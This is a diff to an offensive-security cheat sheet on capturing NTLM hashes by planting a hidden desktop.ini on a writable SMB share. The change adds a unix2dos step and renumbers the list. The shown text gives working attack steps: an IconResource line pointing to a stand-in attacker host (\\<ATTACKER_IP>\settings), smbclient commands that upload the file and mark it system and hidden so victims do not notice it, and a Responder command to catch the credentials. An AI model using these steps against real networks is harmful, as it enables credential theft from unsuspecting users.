@@ -33,14 +33,15 @@ $lnk.Save()
 IconResource=\\<ATTACKER_IP>\settings
 ```
 1. save the file with the above contents inside a `desktop.ini` file
-2. connect to the writable SMB share using `smbclient`
-3. create a folder and give it a non-suspicious name using `mkdir`
-4. set the folder attribute to be a system folder using `setmode <FOLDER> +s`
-5. change int the new folder
-6. upload the `desktop.ini` file `put <INI_FILE>`
-7. make it a system file using `setmode <INI_FILE> +s`
-8. and make it hidden using `setmode <INI_FILE> +h`
-9. *overall,* it should like this:
+2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
+3. connect to the writable SMB share using `smbclient`
+4. create a folder and give it a non-suspicious name using `mkdir`
+5. set the folder attribute to be a system folder using `setmode <FOLDER> +s`
+6. change int the new folder
+7. upload the `desktop.ini` file `put <INI_FILE>`
+8. make it a system file using `setmode <INI_FILE> +s`
+9. and make it hidden using `setmode <INI_FILE> +h`
+10. *overall,* it should like this:
 ```
 smb: \> mkdir <FOLDER>
 smb: \> setmode <FOLDER> +s
@@ -49,7 +50,7 @@ smb: \> put <INI_FILE>
 smb: \> setmode <INI_FILE> +s
 smb: \> setmode <INI_FILE> +h
 ```
-10. fire up responder `responder -I eth0`
+11. fire up responder `responder -I eth0`
 
 # Works when *Selected*: URL files
 ```
